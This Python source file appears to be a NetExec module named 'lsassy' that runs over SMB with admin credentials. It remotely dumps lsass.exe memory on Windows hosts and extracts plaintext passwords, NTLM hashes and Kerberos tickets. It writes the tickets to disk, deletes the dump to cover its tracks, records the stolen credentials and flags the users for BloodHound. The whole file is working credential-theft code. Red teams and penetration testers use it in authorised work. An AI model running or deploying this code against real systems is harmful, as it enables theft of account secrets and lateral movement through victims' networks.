# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com [FR]
#  https://en.hackndo.com [EN]

import os
import sys
from lsassy.dumper import Dumper
from lsassy.impacketfile import ImpacketFile
from lsassy.parser import Parser
from lsassy.session import Session

from impacket.krb5.ccache import CCache

from nxc.helpers.bloodhound import add_user_bh
from nxc.helpers.misc import CATEGORY
from nxc.paths import NXC_PATH


class NXCModule:
    name = "lsassy"
    description = "Dump lsass and parse the result remotely with lsassy"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.method = None
        self.dump_tickets = True
        self.save_dir = os.path.join(NXC_PATH, "modules", "lsassy")
        self.ticket_type = "ccache"

    def options(self, context, module_options):
        """
        METHOD              Method to use to dump lsass.exe with lsassy
        DUMP_TICKETS        If set, will dump Kerberos tickets (Default: True)
        SAVE_DIR            Directory to save dumped tickets
        SAVE_TYPE           Type of ticket to save, either 'kirbi' or 'ccache' (Default: 'ccache')
        """
        self.method = "comsvcs"
        if "METHOD" in module_options:
            self.method = module_options["METHOD"]

        if "DUMP_TICKETS" in module_options:
            self.dump_tickets = module_options["DUMP_TICKETS"].lower() in ["true"]

        if "SAVE_DIR" in module_options:
            self.save_dir = module_options["SAVE_DIR"]

        if "SAVE_TYPE" in module_options:
            self.ticket_type = module_options["SAVE_TYPE"]
            if self.ticket_type not in ["kirbi", "ccache"]:
                context.log.error(f"Invalid SAVE_TYPE '{self.ticket_type}'. Supported types are 'kirbi' and 'ccache'.")
                sys.exit(1)

    def on_admin_login(self, context, connection):
        host = connection.host
        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        session = Session()
        session.get_session(
            address=host,
            target_ip=host,
            port=445,
            lmhash=lmhash,
            nthash=nthash,
            username=username,
            password=password,
            domain=domain_name,
        )

        if session.smb_session is None:
            context.log.fail("Couldn't connect to remote host")
            return False

        dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)
        if dumper is None:
            context.log.fail(f"Unable to load dump method '{self.method}'")
            return False

        file = dumper.dump()
        if file is None:
            context.log.fail("Unable to dump lsass")
            return False

        parsed = Parser(host, file).parse()
        if parsed is None:
            context.log.fail("Unable to parse lsass dump")
            return False
        credentials, tickets, masterkeys = parsed
        file.close()
        context.log.debug("Closed dumper file")
        file_path = file.get_file_path()
        context.log.debug(f"File path: {file_path}")
        try:
            deleted_file = ImpacketFile.delete(session, file_path)
            if deleted_file:
                context.log.debug("Deleted dumper file")
            else:
                context.log.fail(f"[OPSEC] No exception, but failed to delete file: {file_path}")
        except Exception as e:
            context.log.fail(f"[OPSEC] Error deleting temporary lsassy dumper file {file_path}: {e}")

        if credentials is None:
            credentials = []

        if self.dump_tickets and tickets:
            self.write_tickets(context, tickets, host)

        for cred in credentials:
            c = cred.get_object()
            context.log.debug(f"Cred: {c}")

        credentials = [cred.get_object() for cred in credentials if cred.ticket is None and cred.masterkey is None and not cred.get_username().endswith("$")]
        credentials_unique = []
        credentials_output = []
        context.log.debug(f"Credentials: {credentials}")

        for cred in credentials:
            context.log.debug(f"Credential: {cred}")
            if [
                cred["domain"],
                cred["username"],
                cred["password"],
                cred["lmhash"],
                cred["nthash"],
            ] not in credentials_unique:
                credentials_unique.append(
                    [
                        cred["domain"],
                        cred["username"],
                        cred["password"],
                        cred["lmhash"],
                        cred["nthash"],
                    ]
                )
                credentials_output.append(cred)

        context.log.debug("Calling process_credentials")
        self.process_credentials(context, connection, credentials_output)

    def write_tickets(self, context, tickets, host):
        if not tickets:
            context.log.display("No Kerberos tickets found")
            return

        if not os.path.exists(self.save_dir):
            try:
                os.makedirs(self.save_dir)
                context.log.debug(f"Created directory: {self.save_dir} for saving tickets")
            except Exception as e:
                context.log.fail(f"Error creating directory {self.save_dir}: {e}")
                return

        ticket_count = 0
        for ticket in tickets:
            for filename in ticket.kirbi_data:
                try:
                    base_filename = filename.split(".kirbi")[0]
                    timestamp = ticket.EndTime.strftime("%Y%m%d%H%M%S")
                    kirbi_data = ticket.kirbi_data[filename]

                    if self.ticket_type == "ccache":
                        ccache = CCache()
                        ccache.fromKRBCRED(kirbi_data.dump())
                        ticket_filename = f"{base_filename}_{host}_{timestamp}.ccache"
                        ticket_content = ccache.getData()
                    else:
                        ticket_filename = f"{base_filename}_{host}_{timestamp}.kirbi"
                        ticket_content = kirbi_data.dump()

                    ticket_path = os.path.join(self.save_dir, ticket_filename)

                    with open(ticket_path, "wb") as f:
                        f.write(ticket_content)

                    ticket_count += 1
                    context.log.debug(f"Saved ticket: {ticket_filename}")

                except Exception as e:
                    context.log.fail(f"Error writing ticket {filename}: {e}")

        if ticket_count > 0:
            context.log.highlight(f"Saved {ticket_count} Kerberos ticket(s) to {self.save_dir}")
        else:
            context.log.display("No tickets were saved")

    def process_credentials(self, context, connection, credentials):
        if len(credentials) == 0:
            context.log.display("No credentials found")
        credz_bh = []
        domain = None
        for cred in credentials:
            if cred["domain"] is None:
                cred["domain"] = ""
            domain = cred["domain"]
            if "." not in cred["domain"] and cred["domain"].upper() in connection.domain.upper():
                domain = connection.domain  # slim shady
            self.save_credentials(
                context,
                connection,
                cred["domain"],
                cred["username"],
                cred["password"],
                cred["lmhash"],
                cred["nthash"],
            )
            self.print_credentials(
                context,
                cred["domain"],
                cred["username"],
                cred["password"],
                cred["lmhash"],
                cred["nthash"],
            )
            credz_bh.append({"username": cred["username"].upper(), "domain": domain.upper()})
            add_user_bh(credz_bh, domain, context.log, connection.config)

    @staticmethod
    def print_credentials(context, domain, username, password, lmhash, nthash):
        if password is None:
            password = ":".join(h for h in [lmhash, nthash] if h is not None)
        output = f"{domain}\\{username} {password}"
        context.log.highlight(output)

    @staticmethod
    def save_credentials(context, connection, domain, username, password, lmhash, nthash):
        host_id = context.db.get_hosts(connection.host)[0][0]
        if password is not None:
            credential_type = "plaintext"
        else:
            credential_type = "hash"
            password = ":".join(h for h in [lmhash, nthash] if h is not None)
        context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)
